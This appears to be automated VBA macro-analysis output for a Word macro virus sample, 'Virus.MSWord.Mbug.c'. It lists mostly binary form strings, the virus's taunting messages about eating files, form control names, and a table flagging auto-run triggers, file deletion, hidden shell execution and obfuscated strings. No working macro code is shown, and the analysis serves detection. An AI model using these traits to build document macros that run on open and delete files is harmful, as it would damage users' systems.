+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�9H��⁧S����L�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�T�e���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+?�d��EP
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����������.�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+!w`���aE�e`nu'�x�i���x����8�(������0`ge{B���-�m8w3�E�Cޚi-K���h�W��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�#����
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���e��U�8X��F��d7i��(��ؘ'
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�w����GJ
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��ک�h��8ky�)�bkX��7
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��ማ�DJ{
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�ۚX�S�-K�}�ڵ|����7']���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+;�|[x�VĚ*־`�^l1ȩ �!��l*�0Y�|�*��W��e�p�y
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+wd��4b��3I��>
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�ԀTwK�Kz-�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����;g8�%d8�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��#��S���=g�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�5�BC�x�%G�ς8��&�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+e�OD��DF�P���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�I....Want to eat some files.....I'm really 
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Hungry!!!gE
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Start Eat@C
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Eat  laterC
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'MultiPage1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "None" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Page1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Page2'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label16'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoExec            |Runs when the Word document is opened        |
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoNew             |Runs when a new Word document is created     |
+|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbHide              |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|windows             |May enumerate application windows (if        |
+|          |                    |combined with Shell.Application object)      |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Hex String|5~z{                |357E7A7B                                     |
+|Hex String|5~zh                |357E7A68                                     |
+|Hex String|5~zs                |357E7A73                                     |
++----------+--------------------+---------------------------------------------+
+
